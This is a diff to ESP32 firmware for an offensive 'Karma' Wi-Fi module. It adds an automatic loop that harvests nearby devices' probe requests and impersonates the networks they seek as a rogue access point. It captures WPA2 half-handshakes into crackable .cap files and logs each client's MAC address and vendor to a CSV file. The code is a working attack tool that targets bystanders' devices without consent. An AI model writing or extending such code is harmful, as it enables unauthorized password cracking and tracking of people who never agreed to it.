@@ -25,6 +25,7 @@
 #include "wpa_crack.h"        // shared PBKDF2 / handshake-MIC dictionary crack
 #include "rogue_handshake.h"  // manual rogue-AP WPA2 half-handshake engine
 #include "wifi_sd_guard.h"    // ScopedPromiscPause — GDMA-safe mid-promiscuous SD writes
+#include "clock_manager.h"    // timestamps for the auto-mode connects.csv log
 #include <Arduino.h>
 #include <WiFi.h>
 #include <esp_wifi.h>
@@ -58,7 +59,8 @@ static volatile uint8_t s_head = 0, s_tail = 0;
 // ── aggregated tables (PSRAM, drained/owned by main loop) ──────────────────────
 struct KmProbeRec { uint8_t mac[6]; char ssid[33]; uint16_t hits; int8_t rssi;
                     uint32_t firstMs, lastMs; uint8_t ch; };
-struct KmNet      { char ssid[33]; uint16_t devs; uint32_t hits; int8_t rssi; uint8_t ch; };
+struct KmNet      { char ssid[33]; uint16_t devs; uint32_t hits; int8_t rssi; uint8_t ch;
+                    bool captured; uint32_t lastBaitMs; };   // auto-mode bookkeeping
 
 static KmProbeRec* s_recs = nullptr;
 static KmNet*      s_nets = nullptr;
@@ -136,7 +138,7 @@ static void ingest(const KmRing& e) {
         net = s_netCount++;
         KmNet& n = s_nets[net];
         strncpy(n.ssid, e.ssid, 32); n.ssid[32] = '\0';
-        n.devs = 0; n.hits = 0;
+        n.devs = 0; n.hits = 0; n.captured = false; n.lastBaitMs = 0;
     }
     if (net >= 0) {
         KmNet& n = s_nets[net];
@@ -532,14 +534,22 @@ static void sanitizeSsid(const char* ssid, char* out, size_t n) {
 // Write an aircrack/hashcat-ready .cap of the rogue half-handshake: beacon (carries
 // the ESSID/BSSID) + the M1 we injected (our ANonce) + the client's sniffed M2. The
 // M1 replay counter (1) matches the counter the client echoes in M2, so the tools
-// pair them into a crackable hash. Overwrites /apps/karma/<ssid>.cap. Call AFTER the
-// engine teardown (GDMA-safe). Returns true if a file was written.
-static bool karmaSaveCap(const char* ssid, const roguehs::State& s) {
+// pair them into a crackable hash. NEVER overwrites: writes /apps/karma/<ssid>.cap, or
+// <ssid>-1.cap, <ssid>-2.cap, … if that name already exists. Fills `capName` with the
+// basename actually written (e.g. "MyNet-2.cap"). Call AFTER engine teardown (GDMA-safe).
+static bool karmaSaveCap(const char* ssid, const roguehs::State& s, char* capName, size_t capN) {
+    if (capName && capN) capName[0] = '\0';
     if (!sdCardManager.canAccessSD() || !s.gotM2 || !s.m2RawLen) return false;
     sdCardManager.ensureDir(SD_DIR_KARMA);
     char safe[40]; sanitizeSsid(ssid, safe, sizeof(safe));
-    char fname[80]; snprintf(fname, sizeof(fname), SD_DIR_KARMA "/%s.cap", safe);
-    File cap = SD.open(fname, FILE_WRITE);   // overwrite any prior capture for this SSID
+    char base[48], fname[96];
+    snprintf(base, sizeof(base), "%s.cap", safe);
+    snprintf(fname, sizeof(fname), SD_DIR_KARMA "/%s", base);
+    for (int i = 1; SD.exists(fname) && i < 1000; i++) {       // find a free name
+        snprintf(base, sizeof(base), "%s-%d.cap", safe, i);
+        snprintf(fname, sizeof(fname), SD_DIR_KARMA "/%s", base);
+    }
+    File cap = SD.open(fname, FILE_WRITE);
     if (!cap) return false;
     pcap::writeGlobalHeader(cap);
     uint32_t t = s.capTs ? s.capTs : millis();
@@ -547,6 +557,7 @@ static bool karmaSaveCap(const char* ssid, const roguehs::State& s) {
     if (s.m1RawLen)  pcap::writeRecord(cap, s.m1Raw,  s.m1RawLen,  t > 10 ? t - 10 : 0);
     pcap::writeRecord(cap, s.m2Raw, s.m2RawLen, t);
     cap.flush(); cap.close();
+    if (capName && capN) { strncpy(capName, base, capN - 1); capName[capN - 1] = '\0'; }
     return true;
 }
 
@@ -633,7 +644,7 @@ static int karmaSaveTables() {
 static void karmaCrack(const char* ssid, const uint8_t apMac[6], const uint8_t staMac[6],
                        const uint8_t aNonce[32], const uint8_t sNonce[32],
                        const uint8_t* eapol, uint16_t eapolLen, const uint8_t mic[16],
-                       bool capSaved) {
+                       const char* capName) {
     DisplayManager& dm = displayManager;
 
     auto drawCrackHeader = [&]() {
@@ -735,11 +746,10 @@ static void karmaCrack(const char* ssid, const uint8_t apMac[6], const uint8_t s
     }
 
     // Whether or not we cracked it, the half-handshake .cap is already on the SD —
-    // tell the user where, so a failed/aborted on-device crack can move to a PC.
-    if (capSaved) {
-        char safe[40]; sanitizeSsid(ssid, safe, sizeof(safe));
+    // tell the user the exact file, so a failed/aborted on-device crack can move to a PC.
+    if (capName && *capName) {
         dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_CYAN);
-        char cp[64]; snprintf(cp, sizeof(cp), ".cap: /apps/karma/%.20s.cap", safe);
+        char cp[64]; snprintf(cp, sizeof(cp), ".cap: /apps/karma/%.30s", capName);
         dm.println(cp);
         if (!done) {
             dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF);
@@ -782,8 +792,11 @@ static void karmaHandshake(const char* ssid, uint8_t channel, bool interactive) 
             char bm[20]; snprintf(bm, sizeof(bm), "%02X:%02X:%02X:%02X:%02X:%02X",
                 s.apMac[0], s.apMac[1], s.apMac[2], s.apMac[3], s.apMac[4], s.apMac[5]);
             dm.printText(bm);
-            dm.setTextColor(0x7BEF); dm.printText("  CH "); dm.setTextColor(TFT_WHITE);
-            char c[6]; snprintf(c, sizeof(c), "%u", channel); dm.println(c);
+            dm.setTextColor(0x7BEF); dm.printText(" CH "); dm.setTextColor(TFT_WHITE);
+            char c[6]; snprintf(c, sizeof(c), "%u", channel); dm.printText(c);
+            dm.printText(" ");                                  // BSSID identity: randomized vs real
+            dm.setTextColor(s.macRandomized ? TFT_GREEN : TFT_YELLOW);
+            dm.println(s.macRandomized ? "rnd" : "REAL");
             dm.printSeparator();
             // live stage diagnostic — shows how far each client gets
             dm.setCursor(4, dm.getCursorY());
@@ -821,12 +834,14 @@ static void karmaHandshake(const char* ssid, uint8_t channel, bool interactive) 
     const roguehs::State& snap = roguehs::state();
 
     // aircrack/hashcat-ready .cap: beacon (ESSID) + injected M1 + sniffed M2.
-    bool capSaved = karmaSaveCap(ssid, snap);
+    // capName holds the file actually written (never overwrites prior captures).
+    char capName[48];
+    bool capSaved = karmaSaveCap(ssid, snap, capName, sizeof(capName));
 
     bool didCrack = false;
     if (crackReq && snap.gotM2) {
         karmaCrack(ssid, snap.apMac, snap.staMac, snap.anonce, snap.snonce,
-                   snap.eapol, snap.eapolLen, snap.mic, capSaved);
+                   snap.eapol, snap.eapolLen, snap.mic, capSaved ? capName : nullptr);
         didCrack = true;
     }
 
@@ -841,7 +856,9 @@ static void karmaHandshake(const char* ssid, uint8_t channel, bool interactive) 
         else            dm.println("No client completed the handshake");
         if (capSaved) {
             dm.setCursor(4, dm.getCursorY());
-            dm.setTextColor(TFT_CYAN); dm.println("Saved .cap to /apps/karma");
+            dm.setTextColor(TFT_CYAN);
+            char cp[56]; snprintf(cp, sizeof(cp), "Saved /apps/karma/%.30s", capName);
+            dm.println(cp);
         }
     }
 
@@ -969,12 +986,182 @@ static void karmaPortal(const char* ssid, bool interactive) {
     }
 }
 
+// ════════════════════════════════════════════════════════════════════════════════
+// Phase 5 — Auto mode: hands-free harvest → bait sweep.
+// Cycles forever (until [q]): harvest probe requests for a window, then bait the most-
+// wanted SSIDs one at a time with the rogue-AP half-handshake. Every client that
+// completes M2 is saved to a crackable .cap and logged to /apps/karma/connects.csv.
+// Crack the .caps later with `cc`. Capture-only (no inline crack) so the sweep stays
+// fast; portals need interaction so they stay manual ([p]).
+// ════════════════════════════════════════════════════════════════════════════════
+#define KM_AUTO_HARVEST_MS 30000u   // listen window before each sweep
+#define KM_AUTO_BAIT_MS    20000u   // max time per target (or until M2)
+#define KM_AUTO_TOP        8        // most-wanted SSIDs baited per sweep
+#define KM_AUTO_BAIT_CH    6        // clients scan all channels → any works
+
+static void autoLogConnect(const char* ssid, const uint8_t* sta) {
+    if (!sdCardManager.canAccessSD()) return;
+    sdCardManager.ensureDir(SD_DIR_KARMA);
+    bool isNew = !SD.exists(SD_DIR_KARMA "/connects.csv");
+    File f = SD.open(SD_DIR_KARMA "/connects.csv", FILE_APPEND);
+    if (!f) return;
+    if (isNew) f.println("time,ssid,sta_mac,vendor,type");
+    char ts[24]; ClockManager::instance().getTimestamp(ts, sizeof(ts));
+    if (!ts[0]) snprintf(ts, sizeof(ts), "@%lums", (unsigned long)millis());
+    OuiInfo oi = ouiLookup(sta);
+    f.printf("%s,%s,%02X:%02X:%02X:%02X:%02X:%02X,%s,%s\n", ts, ssid,
+             sta[0], sta[1], sta[2], sta[3], sta[4], sta[5],
+             oi.vendor ? oi.vendor : "?", oi.type ? oi.type : "?");
+    f.close();
+}
+
+static void autoDraw(const char* phase, const char* target, uint32_t remainMs,
+                     int idx, int total, int caps, const roguehs::State* st) {
+    DisplayManager& dm = displayManager;
+    if (dm.isBlocked()) return;
+    drawHeader("AUTO", 0, 0);
+    dm.setCursor(4, dm.getCursorY());
+    dm.setTextColor(0x7BEF); dm.printText("Phase "); dm.setTextColor(TFT_CYAN); dm.println(phase);
+    char b[48];
+    dm.setCursor(4, dm.getCursorY());
+    snprintf(b, sizeof(b), "SSIDs:%d  Caps:%d", s_netCount, caps);
+    dm.setTextColor(TFT_WHITE); dm.println(b);
+    if (target && *target) {
+        dm.setCursor(4, dm.getCursorY());
+        dm.setTextColor(0x7BEF); dm.printText("Target "); dm.setTextColor(TFT_YELLOW);
+        char t[34]; snprintf(t, sizeof(t), "%.31s", target); dm.println(t);
+        dm.setCursor(4, dm.getCursorY());
+        snprintf(b, sizeof(b), "(%d/%d)  %lus left", idx, total, (unsigned long)(remainMs / 1000));
+        dm.setTextColor(0x7BEF); dm.println(b);
+    } else {
+        dm.setCursor(4, dm.getCursorY());
+        snprintf(b, sizeof(b), "harvesting  %lus left", (unsigned long)(remainMs / 1000));
+        dm.setTextColor(0x7BEF); dm.println(b);
+    }
+    if (st) {
+        dm.setCursor(4, dm.getCursorY());
+        snprintf(b, sizeof(b), "Prb:%lu Asc:%lu M1:%lu", (unsigned long)st->probes,
+                 (unsigned long)st->assocs, (unsigned long)st->m1Sent);
+        dm.setTextColor(TFT_WHITE); dm.println(b);
+        dm.setCursor(4, dm.getCursorY());
+        if (st->gotM2) { dm.setTextColor(TFT_GREEN); dm.println("M2 captured!"); }
+        else           { dm.setTextColor(0x4208);    dm.println("waiting for client..."); }
+    }
+    dm.printSeparator();
+    dm.setCursor(4, dm.getCursorY());
+    dm.setTextColor(0x7BEF); dm.println("[q] stop auto");
+}
+
+static void karmaAuto() {
+    DisplayManager& dm = displayManager;
+    if (!ensureBuffers()) {
+        freeBuffers();
+        dm.clearScreen(); dm.setCursor(4, outputY); dm.setTextColor(TFT_RED);
+        dm.println("Karma: PSRAM alloc failed");
+        dm.printCommandScreen();
+        return;
+    }
+    int  caps = 0;
+    bool quit = false;
+
+    while (!quit) {
+        // ── harvest window ──
+        harvestStart();
+        uint8_t ch = 1; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+        uint32_t t0 = millis(), lastHop = t0, lastDraw = 0;
+        while (!quit) {
+            uint32_t now = millis();
+            if (now - t0 >= KM_AUTO_HARVEST_MS) break;
+            if (now - lastHop > 250) { ch = (ch % 13) + 1; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); lastHop = now; }
+            drainRing();
+            if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
+            if (now - lastDraw > 400) { autoDraw("HARVEST", nullptr, KM_AUTO_HARVEST_MS - (now - t0), 0, 0, caps, nullptr); lastDraw = now; }
+            char k = inputHandler.getKeyboardInput();
+            if (k == 'q' || k == 'Q') quit = true;
+            vTaskDelay(pdMS_TO_TICKS(10));
+        }
+        harvestStop();
+        if (quit) break;
+
+        // ── bait sweep ──
+        // Pick UNCAPTURED SSIDs, least-recently-baited first (so we round-robin the
+        // whole field instead of looping the same top-8), popularity as the tiebreak.
+        // Captured SSIDs are skipped forever — no wasted re-baiting.
+        int n = s_netCount;
+        if (n == 0) continue;
+        int idx[KM_NET_MAX], m = 0;
+        for (int i = 0; i < n; i++) if (!s_nets[i].captured) idx[m++] = i;
+        if (m == 0) continue;                                         // all captured → re-harvest
+        for (int a = 1; a < m; a++) {                                 // insertion sort, best first
+            int key = idx[a], b = a - 1;
+            while (b >= 0) {
+                const KmNet& x = s_nets[idx[b]]; const KmNet& y = s_nets[key];
+                bool worse = (x.lastBaitMs > y.lastBaitMs) ||
+                             (x.lastBaitMs == y.lastBaitMs && x.devs < y.devs);
+                if (!worse) break;
+                idx[b + 1] = idx[b]; b--;
+            }
+            idx[b + 1] = key;
+        }
+        int total = m < KM_AUTO_TOP ? m : KM_AUTO_TOP;
+        for (int i = 0; i < total && !quit; i++) {
+            int ni = idx[i];
+            char target[33]; strncpy(target, s_nets[ni].ssid, 32); target[32] = '\0';
+            s_nets[ni].lastBaitMs = millis();                         // mark baited (rotation)
+            if (!roguehs::begin(target, KM_AUTO_BAIT_CH)) continue;
+            uint32_t t0b = millis(), lastDraw = 0;
+            while (!quit) {
+                roguehs::poll();
+                const roguehs::State& st = roguehs::state();
+                uint32_t now = millis();
+                if (st.gotM2) break;                                  // captured → next target
+                if (now - t0b >= KM_AUTO_BAIT_MS) break;              // timed out → next target
+                if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
+                if (now - lastDraw > 300) { autoDraw("BAIT", target, KM_AUTO_BAIT_MS - (now - t0b), i + 1, total, caps, &st); lastDraw = now; }
+                char k = inputHandler.getKeyboardInput();
+                if (k == 'q' || k == 'Q') quit = true;
+                vTaskDelay(pdMS_TO_TICKS(5));
+            }
+            bool m2 = roguehs::state().gotM2;
+            roguehs::end();                                           // AP down → SD safe
+            delay(30);
+            if (m2) {                                                // state() still valid post-end
+                const roguehs::State& s = roguehs::state();
+                karmaSaveCap(target, s, nullptr, 0);
+                autoLogConnect(target, s.staMac);
+                s_nets[ni].captured = true;                           // skip it from now on
+                caps++;
+            }
+        }
+        // loop back to harvest (continuous) until [q]
+    }
+
+    harvestStop();
+    roguehs::end();
+    WiFi.mode(WIFI_STA);
+    freeBuffers();
+
+    dm.clearScreen();
+    dm.setCursor(4, outputY); dm.setTextColor(caps ? TFT_GREEN : TFT_YELLOW);
+    char b[48]; snprintf(b, sizeof(b), "Auto stopped - %d handshake(s)", caps);
+    dm.println(b);
+    if (caps) {
+        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
+        dm.println("Saved to /apps/karma - crack with cc");
+    }
+    dm.printCommandScreen();
+}
+
 // ── entry point ─────────────────────────────────────────────────────────────────
 void runKarma(char* args) {
     // ── subcommand: km hs <ssid> [ch]  → WPA2 handshake bait ──
     if (args && *args) {
         char a[96]; strncpy(a, args, sizeof(a) - 1); a[sizeof(a) - 1] = '\0';
         char* tok = strtok(a, " ");
+        if (tok && (strcasecmp(tok, "auto") == 0 || strcasecmp(tok, "a") == 0)) {
+            karmaAuto();
+            return;
+        }
         if (tok && strcasecmp(tok, "hs") == 0) {
             char* ss = strtok(nullptr, " ");
             char* ch = strtok(nullptr, " ");
